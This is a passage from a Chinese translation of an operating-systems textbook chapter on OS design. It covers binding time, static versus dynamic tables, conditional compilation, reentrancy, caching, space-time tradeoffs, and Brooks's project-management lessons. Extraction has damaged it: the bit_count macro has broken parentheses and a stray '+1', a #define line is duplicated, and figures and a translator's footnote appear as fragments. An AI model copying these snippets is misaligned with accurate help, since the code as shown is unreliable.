一般而言，对于当系统重新启动时就 会丢失的暂时的名字，使用表格索引是一个很好的主意。
操作系统经常支持多个名字空间，既在内部又在外部。
例如，在第11章我们了解了Windows 8支持 的三个外部名字空间：文件名、对象名和注册表名(并且还有我们没有考虑的活动目录名)。
此外，还 存在着使用无符号整数的数不清的内部名字空间，例如对象句柄、MFT 项等。
尽管外部名字空间中的名 字都是Unicode 字符串，但是在注册表中查寻一个文件名是不可以的，正如在对象表中使用MFT索引是 不可以的。
在一个良好的设计中，相当多的考虑花在了需要多少个名字空间，每个名字空间中名字的语 法是什么,怎样分辨它们，是否存在抽象的和相对的名字，如此等等。
12.3.5 绑定的时机
为了阐明绑定时机的概念，让我们看一看某些现实世界的例子。
早期绑定的一个例子是某些高等学 校允许父母在婴儿出生时登记入学，并且预付当前的学费。
以后当学生长大到18岁时，学费已经全部付 清，无论此刻学费有多么高。
程序设计语言对于变量通常支持多种绑定时机。
编译器将全局变量绑定到特殊的虚拟地址，这是早 期绑定的例子。
过程的局部变量在过程被调用的时刻(在栈中)分配一个虚拟地址，这是中间绑定。
存 放在堆中的变量(这些变量由C中的malloc或Java中的new分配)仅仅在它们实际被使用的时候才分配虚 拟地址，这便是晚期绑定。
操作系统对大多数数据结构通常使用早期绑定，但是偶尔为了灵活性也使用晚期绑定。
内存分配是 一个相关的案例。
在缺乏地址重定位硬件的机器上，早期的多道程序设计系统不得不在某个内存地址装 载一个程序，并且对其重定位以便在此处运行。
如果它曾经被交换出去，那么它就必须装回到相同的内 存地址，否则就会出错。
相反，页式虚拟内存是晚期绑定的一种形式。
在页面被访问并且实际装入内存 之前，与一个给定的虚拟地址相对应的实际物理地址是不知道的。
晚期绑定的另一个例子是GUI中窗口的放置。
在早期图形系统中，程序员必须为屏幕上的所有图像 设定绝对屏幕坐标，与此相对照，在现代GUI中，软件使用相对于窗口原点的坐标，但是在窗口被放置 在屏幕上之前该坐标是不确定的，并且以后，它甚至是可能改变的。
12.3.6 静态与动态结构
一个替代的策略是将进程表建立为一个小型表的链表，最初只有一个表。
如果该表被填满，可以从
全局存储池中分配另一个表并且 将其链接到前一个表。
这样，在 全部内核内存被耗尽之前，进程 表不可能被填满。
图12-5 对于给定PID搜索进程表的代码
查找给定PID,pid 的代码。
该代码简单有效。
对于小型表的链表，做同样的搜索则需要更多的工作。
当存在大量的内存或者当表的利用可以猜测得相当准确时，静态表是最佳的。
例如，在一个单用户 系统中，用户不太可能立刻启动128个以上的进程，并且如果试图启动第129个进程失败了，也并不是一 个彻底的灾难。
还有另一种选择是使用一个固定大小的表，但是如果该表填满了，就分配一个新的固定大小的表， 比方说大小是原来的两倍。
然后将当前的表项复制到新表中并且把旧表返回空闲存储池。
这样，表总是 连续的而不是链接的。
此处的缺点是需要某些存储管理，并且现在表的地址是变量而不是常量。
对于内核栈也存在类似的问题。
当一个线程切换到内核模式，或者当一个内核模式线程运行时，它 在内核空间中需要一个栈。
对于用户线程，栈可以初始化成从虚拟地址空间的顶部向下生长，所以大小 不需要预先设定。
对于内核线程，大小必须预先设定，因为栈占据了某些内核虚拟地址空间并且可能存 在许多栈。
问题是：每个栈应该得到多少空间?
此处的权衡与进程表是类似的，将关键的数据结构变成 动态的是可以的，但是很复杂。
另一个静态-动态权衡是进程调度。
在某些系统中，特别是在实时系统中，调度可以预先静态地完 成。
例如，航空公司在班机启航前几周就知道它的飞机什么时候要出发。
类似地，多媒体系统预先知道 何时调度音频、视频和其他进程。
对于通用的应用，这些考虑是不成立的，并且调度必须是动态的。
12.3.7 自顶向下与自底向上的实现
虽然最好是自顶向下地设计系统，但是在理论上系统可以自顶向下或者自底向上地实现。
在自顶向 下的实现中，实现者以系统调用处理程序为开端，并且探究需要什么机制和数据结构来支持它们。
接着 编写这些过程等，直到触及硬件。
然后，可以使用一个简单的调度器(例如轮转调度)来解决多道程序设计问题。
在这一时刻，测试 系统以了解它是否能够正确地运行多个进程应该是可能的。
如果运转正常，此时可以开始仔细地定义贯 穿系统的各种各样的表格和数据结构，特别是那些用于进程和线程管理以及后面内存管理的表格与数据 结 构 。
I/O 和文件系统在最初可以等一等，用于测试和调试目的的读键盘与写屏幕的基本方法除外。
在 某些情况下，关键的低层数据结构应该得到保护，这可以通过只允许经由特定的访问过程来访问而实现—— 实际上这是面向对象的程序设计思想，不论采用何种程序设计语言。
当较低的层次完成时，可以彻底地 测试它们。
这样，系统自底向上推进，很像是建筑商建造高层办公楼的方式。
12.3.8 同步通信与异步通信
另一个经常在操作系统设计者之间引发争论的话题是系统构件间的通信应该是同步还是异步的(还 有，与此相关的，线程是否比事件好)。
这个话题经常引发两个阵营的支持者之间热烈的争论，当然争 论并不像决定真正重要的事情时(比如vi和emacs 哪个是最好的编辑器)那么激烈。
我们使用8.2节(宽 松)的定义“同步”来表示调用会阻塞直到完成。
相反，“异步”表示调用者继续执行。
这两种模式有 着各自的优缺点。
12.3.9 实用技术
我们刚刚了解了系统设计与实现的某些抽象思想，现在将针对系统实现考察一些有用的具体技术。
这方面的技术很多，但是篇幅的限制使我们只能介绍其中的少数技术。
1.隐藏硬件
许多硬件是十分麻烦的，所以只好尽早将其隐藏起来(除非它要展现能力，而大多数硬件不会这样)。
某些非常低层的细节可以通过如图12-2所示层次1的HAL 类型的层次得到隐藏。
然而，许多硬件细节不 能以这样的方式来隐藏。
值得尽早关注的一件事情是如何处理中断。
中断使得程序设计令人不愉快，但是操作系统必须对它 们进行处理。
一种方法是立刻将中断转变成别的东西，例如，每个中断都可以转变成即时弹出的线程。
在这一时刻，我们处理的是线程，而不是中断。
第二种方法是将每个中断转换成在一个互斥量上的unlock操作，该互斥量对应正在等待的驱动程序。
于是，中断的唯一效果就是导致某个线程变为就绪。
大多数操作系统被设计成运行在多个硬件平台上。
这些平台可以按照CPU 芯片、MMU、 字 长 、 RAM 大小以及不能容易地由HAL或等价模块屏蔽的其他特性来区分。
尽管如此，人们高度期望拥有单
一的一组源文件用来生成所有的版本，否则，后来发现的每个程序错误必须在多个源文件中修改多次， 从而有源文件逐渐疏远的危险。
某些硬件的差异，例如RAM大小，可以通过让操作系统在引导的时候确定其取值并且保存在一个 变量中来处理。
内存分配器可以利用RAM大小变量来确定构造多大的数据块高速缓存、页表等。
甚至 静态的表格，如进程表，也可以基于总的可用内存来确定大小。
然而，其他的差异，例如不同的CPU 芯片，就不能让单一的二进制代码在运行的时候确定它正在哪 一个CPU上运行。
解决一个源代码多个目标机的问题的一种方法是使用条件编译。
在源文件中，定义了 一定的编译时标志用于不同的配置，并且这些标志用来将独立于CPU 、字 长 、MMU 等的代码用括号括 起。
例如，设想一个操作系统运行在x86芯片的IA32 行(有时指x86-32) 或UItraSPARC芯片上，这就需 要不同的初始化代码。
可以像图12-6a中那样编写init 过程的代码。
根据CPU的取值(该值定义在头文件 config.h 中),实现一种初始化或其他的初始化过程。
由于实际的二进制代码只包含目标机所需要的代码， 这样就不会损失效率。
a)
b)
图12-6 a) 依赖CPU的条件编译；b) 依赖字长的条件编译
第二个例子，假设需要一个数据类型Register, 它在IA32上是32位，在UltraSPARC上是64位。
这可 以由图12-6b中的条件代码来处理(假设编译器产生32位的int和64位的long) 。
一旦做出这样的定义(可 能是在别的什么地方的头文件中),程序员就可以只需声明变量为Register类型并且确信它们将具有正确 的长度 。
当然，头文件config.h 必须正确地定义。
对于Pentium 处理器，它大概是这样的：
#define CPU IA32
#define WORD_LENGTH 32
为了编译针对UltraSPARC的系统，应该使用不同的config.h, 其中具有针对UltraSPARC的正确取值， 它或许是这样的：
#define CPU ULTRASPARC
#define WORD_LENGTH 64
#define WORD_LENGTH 64
这个例子例证了前面讨论过的正交性原则。
那些依赖CPU的细节应该基于CPU宏而条件编译，而那 些依赖字长的细节则应该使用WORD_LENGTH 宏。
类似的考虑对于许多其他参数也是适用的。
2. 引 用
人们常说在计算机科学中没有什么问题不能通过引用而得到解决。
虽然有些夸大其词，但是的确存 在一定程度的真实性。
让我们考虑一些例子。
在基于x86的系统上，当按下一个键时，硬件将生成一个中 断并且将键的编号而不是ASCII 字符编码送到一个设备寄存器中。
当后来释放此键时，生成第二个中断， 同样伴随一个键编号。
这一引用为操作系统使用键编号作为索引检索一张表格以获取ASCII 字符提供了可 能，这使得处理世界上不同国家使用的各种键盘变得十分容易。
获得按下与释放两个信息使得将任何键 作为换档键成为可能，因为操作系统知道键按下与释放的准确序列。
引用还被用在输出上。
程序可以将ASCII 字符写到屏幕上，但是这些字符被解释为针对当前输出字 体的一张表格的索引。
表项包含字符的位图。
这一引用使得将字符与字体相分离成为可能。
引用的另一个例子是UNIX中主设备号的使用。
在内核内部，有一张表格以块设备的主设备号作为 索引，还有另一张表格用于字符设备。
当一个进程打开一个特定的文件(例如/dev/hd0) 时，系统从i节 点提取出类型(块设备或字符设备)和主副设备号，并且检索适当的驱动程序表以找到驱动程序。
这一 引用使得重新配置系统十分容易，因为程序涉及的是符号化的设备名，而不是实际的驱动程序名。
还有另一个引用的例子出现在消息传递的系统中，该系统命名一个邮箱而不是一个进程作为消息的 目的地。
通过引用邮箱(而不是指定一个进程作为目的地),能够获得很大的灵活性(例如，让一位秘 书处理她的老板的消息)。
在某种意义上，使用诸如
#define PROC_TABLE_SIZE 256
的宏也是引用的一种形式，因为程序员无须知道表格实际有多大就可以编写代码。
一个好的习惯是为所 有的常量提供符号化名字(有时-1、0和1除外),并且将它们放在头文件中，同时提供注释解释它们代 表什么。
3.可重用性
在略微不同的上下文中重用相同的代码通常是可行的。
这样做是一个很好的想法，因为它减少了二 进制代码的大小并且意味着代码只需要调试一次。
例如，假设用位图来跟踪磁盘上的空闲块。
磁盘块管 理可以通过提供管理位图的过程alloc 和free 得到处理。
在最低限度上，这些过程应该对任何磁盘起作用。
但是我们可以比这更进一步。
相同的过程还可以 用于管理内存块、文件系统块高速缓存中的块，以及节点。
事实上，它们可以用来分配与回收能够线 性编号的任意资源。
4.重入
重入指的是代码同时被执行两次或多次的能力。
在多处理器系统上，总是存在着这样的危险：当一 个CPU 执行某个过程时，另一个CPU 在第一个完成之前也开始执行它。
在这种情况下，不同CPU 上的两 个(或多个)线程可能在同时执行相同的代码。
这种情况必须通过使用互斥量或者某些其他保护临界区 的方法进行处理。
然而，在单处理器上，问题也是存在的。
特别地，大多数操作系统是在允许中断的情况下运行的。
否则，将丢失许多中断并且使系统不可靠。
当操作系统忙于执行某个过程P 时，完全有可能发生一个中 断并且中断处理程序也调用P。
如 果P 的数据结构在中断发生的时刻处于不一致的状态，中断处理程序就 会注意到它们处于不一致的状态并且失败。
一个显而易见的例子是当P 是调度器时，这种情况便会发生。
假设某个进程用完了它的时间配额， 并且操作系统正将其移动到其队列的末尾。
在列表处理的半路，中断发生了，使得某个进程就绪，并且 运行调度器。
由于队列处于不一致的状态，系统有可能会崩溃。
因此，即使在单处理器上，最好是操作 系统的大部分为可重入的，关键的数据结构用互斥量来保护，并且在中断不被允许的时刻禁用中断。
5.蛮力法
使用蛮力法解决问题多年以来获得了较差的名声，但是依据简单性它经常是行之有效的方法。
每个 操作系统都有许多很少会调用的过程或是具有很少数据的操作，不值得对它们进行优化。
例如，在系统 内部经常有必要搜索各种表格和数组。
蛮力算法只是让表格保持表项建立时的顺序，并且当必须查找某
个东西时线性地搜索表格。
如果表项的数目很少(例如少于1000个),对表格排序或建立散列表的好处 不大，但是代码却复杂得多并且很有可能在其中存在错误。
如对挂载表(用来在UNIX 系统中记录已挂 载的文件系统)排序或者建立哈希表就真的不是一个好主意。
6.首先检查错误
系统调用可能由于各种各样的原因而执行失败：要打开的文件属于他人；因为进程表满而创建进程 失败；或者因为目标进程不存在而使信号不能被发送。
操作系统在执行调用之前必须无微不至地检查每 一个可能的错误。
许多系统调用还需要获得资源，例如进程表的空位、i 节点表的空位或文件描述符。
一般性的建议 是在获得资源之前，首先进行检查以了解系统调用能否实际执行，这样可以省去许多麻烦。
这意味着， 将所有的测试放在执行系统调用的过程的开始。
每个测试应该具有如下的形式：
if (error_condition)return(ERROR_CODE);
如果调用通过了所有严格的测试，那么就可以肯定它将会取得成功。
在这一时刻它才能获得资源。
如果将获得资源的测试分散开，那么就意味着如果在这一过程中某个测试失败，到这一时刻已经获 得的所有资源都必须归还。
如果在这里发生了一个错误并且资源没有被归还，可能并不会立刻发生破坏。
例如，一个进程表项可能只是变得永久地不可用。
然而，随着时间的流逝，这一差错可能会触发多次。
最 终，大多数或全部进程表项可能都会变得不可用，导致系统以一种极度不可预料且难以调试的方式崩溃。
许多系统以内存泄漏的形式遭受了这一问题的侵害。
典型地，程序调用malloc分配了空间，但是以 后忘记了调用free 释放它。
逐渐地，所有的内存都消失了，直到系统重新启动。
Engler 等人(2000)推荐了一种有趣的方法在编译时检查某些这样的错误。
他们注意到程序员知道 许多定式而编译器并不知道，例如当你锁定一个互斥量的时候，所有在锁定操作处开始的路径都必须包 含一个解除锁定的操作并且在相同的互斥量上没有更多的锁定。
他们设计了一种方法让程序员将这一事 实告诉编译器，并且指示编译器在编译时检查所有路径以发现对定式的违犯。
程序员还可以设定已分配 的内存必须在所有路径上释放，以及设定许多其他的条件。
12.4 性能
所有事情都是平等的，一个快速的操作系统比一个慢速的操作系统好。
然而，一个快速而不可靠的 操作系统还不如一个慢速但可靠的操作系统。
由于复杂的优化经常会导致程序错误，有节制地使用它们 是很重要的。
尽管如此，在性能是至关重要的地方进行优化还是值得的。
在下面几节我们将看一些一般 的技术，这些技术在特定的地方可以用来改进性能。
12.4.1 操作系统为什么运行缓慢
在讨论优化技术之前，值得指出的是许多操作系统运行缓慢在很大程度上是操作系统自身造成的。
例如，古老的操作系统，如MS-DOS和UNIX版本7在几秒钟内就可以启动。
现代UNIX系统和Windows 8 尽管运行在快1000倍的硬件上，可能要花费几分钟才能启动。
原因是它们要做更多的事情，有用的或无 用的。
看一个相关的案例。
即插即用使得安装一个新的硬件设备相当容易，但是付出的代价是在每次启 动时，操作系统都必须要检查所有的硬件以了解是否存在新的设备。
这一总线扫描是要花时间的。
12.4.2 什么应该优化
作为一般的规则，系统的第一版应该尽可能简单明了。
唯一的优化应该是那些显而易见要成为不可 避免的问题的事情。
为文件系统提供块高速缓存就是这样的一个例子。
一旦系统引导起来并运行，就应 该仔细地测量以了解时间真正花在了什么地方。
基于这些数字，应该在最有帮助的地方做出优化。
这里有一个关于优化不但不好反而更坏的真实故事。
作者(Tanenbaum) 以前的一名学生编写了 MINIX 的mkfs 程序。
该程序在一个新格式化的磁盘上布下一个新的文件系统。
这名学生花了大约6个月 的时间对其进行优化，包括放入磁盘高速缓存。
当他上交该程序时，它不能工作，需要另外几个月进行 调试。
在计算机的生命周期中，当系统安装时，该程序典型地在硬盘上运行一次。
它还对每块做格式化 的软盘运行一次。
每次运行大约耗时2秒。
即使未优化的版本耗时1分钟，花费如此多的时间优化一个很 少使用的程序也是相当不值的。
对于性能优化， 一条相当适用的口号是：
足够好就够好了。
12.4.3 空间一时间的权衡
一种常用而有益的技术是用宏来代替小的过程。
使用宏消除了通常与过程调用相关联的开销。
如果 调用出现在一个循环的内部，这种获益尤其显著。
例如，假设我们使用位图来跟踪资源，并且经常需要 了解在位图的某一部分中有多少个单元是空闲的。
为此，我们需要一个过程bit_count 来计数一个字节中值 为1的位的个数。
图12-7a中给出了简单明了的过程。
它对一个字节中的各个位循环，每次它们计数一次。
这个过程十分简单直接。
该过程有两个低效的根源。
首先，它必须被调用，必须为它分配栈空间，并且必须返回。
每个过程 调用都有这个开销。
第二，它包含一个循环，并且总是存在与循环相关联的某些开销。
sum =bit_count(table[i]);
a)
#define bit_count(b)(b&1)+((b>>1)&1)+((b>>2)&1)+((b>>3)&1)+1
((b>>4)&1)+((b>>5)&1)+(b>>6)&1)+((b>>7)&1))
b)
/*在一个表中查找位计数的宏*/
char bits[256]={0,1,1,2,1,2,2,3,1,2,2,3,2,3,3,4,1,2,2,3,2,3,3,...;
#define bit_count(b)(int)bits[b]
c)
图12-7 a)对一个字节中的位进行计数的过程；b)对位进行计数的宏；c)在表中查找位计数
这个宏调用看起来与过程调用等同。
因此，除了定义有一点凌乱以外，宏中的代码看上去并不比过程调 用中的代码要差，但是它的效率更高，因为它消除了过程调用的开销和循环的开销。
我们可以更进一步研究这个例子。
究竟为什么计算位计数?
为什么不在一个表中查找?
毕竟只有256 个不同的字节，每个字节具有0到8之间的唯一的值。
我们可以声明一个256项的表bits,每一项(在编译 时)初始化成对应于该字节值的位计数。
采用这一方法在运行时根本就不需要计算，只要一个变址操作 就可以了。
图12-7c中给出了做这一工作的宏。
这是用内存换取计算时间的明显的例子。
然而，我们还可以再进一步。
如果需要整个32位字的位计 数，使用我们的bit_count 宏，每个字我们需要执行四次查找。
如果将表扩展到65536项，每个字查找两 次就足够了，代价是更大的表。
在表中查找答案可以用在其他方面。
一种著名的图像压缩技术GIF, 使用表查找来编码24位RGB图 像。
然而，GIF 只对具有256种颜色或更少颜色的图像起作用。
对于每幅要压缩的图像，构造一个256项 的调色板，每一项包含一个24位的RGB值。
压缩过的图像于是包含每个像素的8位索引，而不是24位颜 色值，增益因子为3。
图12-8中针对一幅图像的一个4×4区域说明了这一思想。
原始未压缩的图像如图 12-8a 所示，该图中每个取值是一个24位的值，每8位给出红、绿和蓝的强度。
GIF 图像如图12-8b所示， 该图中每个取值是一个进入调色板的8位索引。
调色板作为图像文件的一部分存放，如图12-8c所示。
实 际 上 ，GIF 算法的内容比这要多，但是思想的核心是表查找。
24位 8位 24位
0
a) b) c)
图12-8 a)每个像素24位的未压缩图像的局部；b)以 GIF 压缩的相同局部，每个像素8位；c) 调色板
与此同时，存在着另一种方法可以压缩图像，并且这种方法说明了一种不同的权衡方法。
PostScript是 一种程序设计语言，可以用来描述图像(实际上，任何程序设计语言都可以描述图像，但是PostScript 专为 这一目的进行了调节)。
许多打印机具有内嵌的PostScript解释器，能够运行发送给它们的PostScript程序。
例如，如果在一幅图像中存在一个像素矩形块具有相同的颜色，用于该图像的PostScript 程序将携带 指令，用来将一个矩形放置在一定的位置并且用一定的颜色填充该矩形。
只需要少数几个位就可以发出此 命令。
当打印机接收图像时，打印机中的解释器必须运行程序才能绘制出图像。
因此，PostScript 以更多的 计算为代价实现了数据压缩，这是与表查找不同的一种权衡，但是当内存或带宽不足时是颇有价值的。
其他的权衡经常牵涉数据结构。
双向链表比单向链表占据更多的内存，但是经常使得访问表项速度 更快。
散列表甚至更浪费空间，但是要更快。
简而言之，当优化一段代码时要考虑的重要事情之一是： 使用不同的数据结构是否将产生最佳的时间-空间平衡。
12.4.4 缓存
用于改进性能的一项众所周知的技术是缓存。
在任何相同的结果可能需要被获取多次的情况下，缓 存都是适用的。
一般的方法是首先做完整的工作，然后将结果保存在缓存中。
对于后来的获取结果的工 作，首先要检查缓存。
如果结果在缓存中，就使用它。
否则，再做完整的工作。
我们已经看到缓存在文件系统内部的运用，在缓存中保存一定数目最近用过的磁盘块，这样在每次 命中时就可以省略磁盘读操作。
然而，缓存还可以用于许多其他目的。
例如，解析路径名的代价就高昂 得令人吃惊。
再次考虑图4-34中UNIX的例子。
为了查找/usr/ast/mbox, 需要如下的磁盘访问：
1)读入根目录的节点 (i 节点1)。
2)读入根目录(磁盘块1)。
3)读入/usr的i节 点(i节点6)。
4)读入/usr目录(磁盘块132)。
5)读入/usr/ast的i节 点(i 节点26)。
6)读入/usr/ast目录(磁盘块406)。
只是为了获得文件的i节点号就需要6次磁盘访问。
然后必须读 入i节点本身以获得磁盘块号。
如果文件小于块的大小(例如 1024字节),那么需要8次磁盘访问才读到数据。
某些系统通过对(路径，i 节点)的组合进行缓存来优化 路径名的解析。
对于图4-34的例子，在解析/usr/ast/mbox 之后， 高速缓存中肯定会保存图12-9的前三项。
最后三项来自解析其 他路径。
图12-9 图4-35的i节点缓存的局部
当必须查找一个路径时，名字解析器首先查找缓存并搜索
它以找到缓存中存在的最长的子字符串。
例如，如果存在路径/usr/ast/grants/stw, 缓存会返回/usr/ast/ 是i 节点26这样的事实，这样搜索就可以从这里开始，消除了四次磁盘访问。
对路径进行缓存存在的一个问题是，文件名与i 节点号之间的映射并不总是固定的。
假设文件 /usr/ast/mbox从系统中被删除，并且其i节点重用于不同用户所拥有的不同的文件。
随后，文件/usr/ ast/mbox 再次被创建，并且这一次它得到节点106。
如果不对这件事情进行预防，缓存项现在将是错误 的，并且后来的查找将返回错误的i节点号。
为此，当一个文件或目录被删除时，它的缓存项以及(如 果它是一个目录的话)它下面所有的项都必须从缓存中清除。
12.4.5 线索
缓存项总是正确的。
缓存搜索可能失败，但是如果找到了一项，那么这一项保证是正确的并且无需 再费周折就可以使用。
在某些系统中，包含线索 (hint) 的表是十分便利的。
这些线索是关于答案的提
示，但是它们并不保证是正确的。
调用者必须自行对结果进行验证。
众所周知的关于线索的例子是嵌在Web页上的URL 。
点击一个链接并不能保证被指向的Web 页就在 那里。
事实上，被指向的网页可能10年前就被删除了。
因此包含URL的网页上面的信息只是一个线索。
线索还用于连接远程文件。
信息是提示有关远程文件某些事项的线索，例如文件存放的位置。
然而，自 该线索被记录以来，文件可能已经被移动或者删除了，所以为了明确线索是否正确，总是需要对其进行检查。
12.4.6利用局部性
进程和程序的行为并不是随机的，它们在时间上和空间上展现出相当程度的局部性，并且可以以各 种方式利用该信息来改进性能。
空间局部性的一个常见例子是：进程并不是在其地址空间内部随机地到 处跳转的。
在一个给定的时间间隔内，它们倾向于使用数目比较少的页面。
进程正在有效地使用的页面 可以被标记为它的工作集，并且操作系统能够确保当进程被允许运行时，它的工作集在内存中，这样就 减少了缺页的次数。
局部化原理对于文件也是成立的。
当一个进程选择了一个特定的工作目录时，很可能将来许多文件 引用将指向该目录中的文件。
通过在磁盘上将每个目录的所有i 节点和文件就近放在一起，可能会获得 性能的改善。
这一原理正是Berkeley快速文件系统的基础 (McKusick 等人，1984)。
12.4.7 优化常见的情况
区分最常见的情况和最坏可能的情况并且分别处理它们，这通常是一个好主意。
针对这两者的代码 常常是相当不同的。
重要的是要使常见的情况速度快。
对于最坏的情况，如果它很少发生，使其正确就 足够了。
第一个例子，考虑进入一个临界区。
在大多数时间中是可以成功进入的，特别是如果进程在临界区 内部不花费很多时间的话。
Windows 8提供的一个Win API调用EnterCriticalSection 就利用了这一期望， 它自动地在用户态测试一个标志(使用TSL 或等价物)。
如果测试成功，进程只是进入临界区并且不需要 内核调用。
如果测试失败，库过程将调用一个信号量上的down 操作以阻塞进程。
因此，在通常情况下是 不需要内核调用的。
在第2章中可以见到，Linux 中的快速用户区互斥也无争议地为常见情况做了优化。
第二个例子，考虑设置一个警报(在UNIX 中使用信号)。
如果当前没有警报待完成，那么构造一个 警报并且将其放在定时器队列上是很简单的。
然而，如果已经有一个警报待完成，那么就必须找到它并 且从定时器队列中删除。
由于alarm 调用并未指明是否已经设置了一个警报，所以系统必须假设最坏的 情况，即有一个警报。
然而，由于大多数时间不存在警报待完成，并且由于删除一个现有的警报代价高 昂，所以区分这两种情况是一个好主意。
12.5 项目管理
程序员是天生的乐观主义者。
他们中的大多数认为编写程序的方式就是急切地奔向键盘并且开始击 键，不久以后完全调试好的程序就完成了。
对于非常大型的程序，事实并非如此。
在下面几节，关于管 理大型软件项目，特别是大型操作系统项目，我们有一些看法要陈述。
12.5.1 人月神话
经典著作《人月神话》的作者Fred Brooks是OS/360 的设计者之一，他后来转向了学术界。
在这部 经典著作中，Fred Brooks讨论了建造大型操作系统为什么如此艰难的问题(Brooks,1975,1995) 。
当大 多数程序员看到他声称程序员在大型项目中每年只能产出1000行调试好的代码时，他们怀疑Brooks 教授 是否生活在外层空间，或许是在臭虫星 (Planet Bug——此处Bug 为双关语)上。
毕竟，他们中的大多数 在熬夜的时候一个晚上就可以产出1000行程序。
这怎么可能是任何一个IQ 大于50的人一年的产出呢?
Brooks指出的是，具有几百名程序员的大型项目完全不同于小型项目，并且从小型项目获得的结果并不
能放大到大型项目。
在一个大型项目中，甚至在编码开始之前，大量的时间就消耗在规划如何将工作划分成 模块、仔细地说明模块及其接口，以及试图设想模块将怎样互相作用这样的事情上。
然后，模块必须独立地 编码和调试。
最后，模块必须集成起来并且必须将系统作为一个整体来测试。
通常的情况是，每个模块单独 测试时工作得十分完美，但是当所有部分集成在一起时，系统立刻崩溃。
Brooks 将工作量估计如下：
· 1/3规划
· 1/6编码
· 1/4模块测试
· 1/4系统测试
换言之，编写代码是容易的部分，困难的部分是断定应该有哪些模块并且使模块A 与模块B 正确地 交互。
在由一名程序员编写的小型程序中，留待处理的所有部分都是简单的部分。
Brooks 的书的标题来自他的断言，即人与时间是不可互换的。
不存在“人月”这样的单位。
如果一 个项目需要15个人花2年时间构建，很难想象360个人能够在1个月内构建它，甚至让60个人在6个月内做 出它或许也是不可能的。
产生这一效应有三个原因。
第一，工作不可能完全并行化。
直到完成规划并且确定了需要哪些模块 以及它们的接口，甚至都不能开始编码。
对于一个2年的项目，仅仅规划可能就要花费8个月。
第二，为了完全利用数目众多的程序员，工作必须划分成数目众多的模块，这样每个人才能有事情做。
由于每个模块可能潜在地与每个其他模块相互作用，需要将模块一模块相互作用的数目看成随着模块数目 的平方而增长，也就是说，随着程序员数目的平方而增长。
这一复杂性很快就会失去控制。
对于大型项目 而言，人与月之间的权衡远不是线性的，对63个软件项目精细的测量证实了这一点(Boehm,1981)。
对于人员与时间的权衡， Brooks 将他的经验总结在Brooks 定律中：
无论分配多少妇女从事这一工作，生一个孩子都需要9个月。
12.5.2 团队结构
商业操作系统是大型的软件项目，总是需要大型的人员团队。
人员的质量极为重要。
几十年来人们 已经众所周知的是，顶尖的程序员比拙劣的程序员生产率要高出10倍(Sackman 等人，1968)。
麻烦在于， 当你需要200名程序员时，找到200名顶尖的程序员非常困难，对于程序员的质量你不得不有所将就。
在20世纪70年代，Harlan Mills把“一些程序员比其他程序员要好很多”的观察结果与对体系结构 一致性的需要相结合，提出了首席程序员团队(chief programmer team) 的 范 式(Baker,1972) 。
他 的 思 想是要像一个外科手术团队，而不是像一个杀猪屠夫团队那样组织一个程序员团队。
不是每个人像疯子 一样乱砍一气，而是由一个人掌握着手术刀，其他人在那里提供支持。
对于一个10名人员的项目，Mills 建议的团队结构如图12-10所示。
自从提出这一建议并付诸实施，30年过去了。
一些事情已经变化(例如需要一个语言层——C比 PL/I 更为简单),但是只需要一名才智超群的人员对设计进行控制仍然是正确的。
并且这名才智超群者 在设计和编程上应该能够100%地起作用，因此需要支持人员。
尽管借助于计算机的帮助，现在一个更
e 兰斯 (Reims) 是法国东北部城市。
——译者注
小的支持人员队伍就足够了。
但是在本质上，这一思想仍然是有效的。
图12-10 Mills 建议的10人首席程序员团队的分工
实际上，大型公司拥有生产软件的丰富经验并且知道如果它随意地生产会发生什么,这样的公司趋 向于至少是试图正确地做事情。
相反，较小的、较新的公司，匆匆忙忙地希望其产品早日上市，不能总 是仔细地生产他们的软件。
这经常导致远远不是最优化的结果。
12.5.3 经验的作用
拥有丰富经验的设计人员对于一个操作系统项目来说至关重要。
Brooks 指出，大多数错误不是在代 码中，而是在设计中。
程序员正确地做了吩咐他们要做的事情，而吩咐他们要做的事情是错误的。
再多 测试软件都无法弥补糟糕的设计说明书。
Brooks 的解决方案是放弃图12-11a的经典开发模型而采用图12-11b的模型。
此处的想法是首先编写 一个主程序，它仅仅调用顶层过程，而顶层过程最初是哑过程。
从项目的第一天开始，系统就可以编译 和运行，尽管它什么都做不了。
随着时间的流逝，模块被插入到完全的系统中。
这一方法的成效是系统 集成测试能够持续地执行，这样设计中的错误就可以更早地显露出来，从而让拙劣的设计决策导致的学 习过程更早开始。
哑过程1
主程序
哑过程2 哑过程3
a) b)
图12-11 a)传统的分阶段软件设计过程；b) 另一种设计在第一天开始就产生一个(什么都不做的)工作系统
12.5.4 没有银弹
除了《人月神话》,Brooks 还写了一篇有影响的学术论文，称为“No Silver Bullet”(没有银弹) (Brooks,1987)。
在这篇文章中，他主张在十年之内由各色人等兜售的灵丹妙药中，没有一样能够在软 件生产率上产生数量级的改进。
经验表明他是正确的。
在建议的银弹中，包括更好的高级语言、面向对象的程序设计、人工智能、专家系统、自动程序设 计、图形化程序设计、程序验证以及程序设计环境。
或许在下一个十年将会看到一颗银弹，或许我们将 只好满足于逐步的、渐进的改进。
12.6 操作系统设计的趋势
1899年美国专利局局长Charles H.Duell请求当时的总统McKinley (麦金利)取消专利局(以及他 的工作!
),因为他声称“每件能发明的事物都已经发明了”(Cerf and Navasky,1984)。
然 而 ，Thomas Edison (托马斯 ·爱迪生)在几年之内就发明了几件新的物品，包括电灯、留声机和电影放映机。
这里 要说的就是，世界在不断变化，操作系统必须随时适应新的现实环境。
在这一部分，我们会提到一些趋 势，它们对当今的操作系统开发者具有重大意义。
读者请勿误解，下面提到的硬件发展其实已经出现。
现在仍未出现的是能够有效使用它们的操作系 统软件。
一般来说，当新硬件出现时，人们习惯于仅仅将旧的软件(Linux 、Windows 等)在其上运行。
从长远来看，这不是一个好主意。
我们真正需要的是，利用创新软件来处理创新硬件。
如果你是一个计 算机科学或计算机工程专业的学生，或者一个信息通信技术的专业人士，你的家庭作业就是思考如何设 计这样的软件。
12.6.1 虚拟化与云
虚拟化再次到来，它第一次出现在1967年的IBM CP/CMS系统中，现在它重回x86平台。
许多电脑现在在 裸机上运行虚拟机管理程序，如图12-12所示。
虚拟机 管理程序会运行多个虚拟机，每个虚拟机有单独的操作 系统。
这种现象在第7章已经讨论过，并且是未来的发 展趋势。
现在，很多公司正在通过对其他资源进行虚拟 化，进一步深化这种思路。
例如，人们对网络设备控制 的虚拟化研究兴趣很浓厚，甚至到了在云中对它们的网
图12-12 运行4个虚拟机的管理程序
络进行控制的程度。
除此之外，制造商和研究者们持续地研究如何使虚拟机管理程序从概念上做得更好， 包括更小、更快和资源隔离更可信。
12.6.2 众核芯片
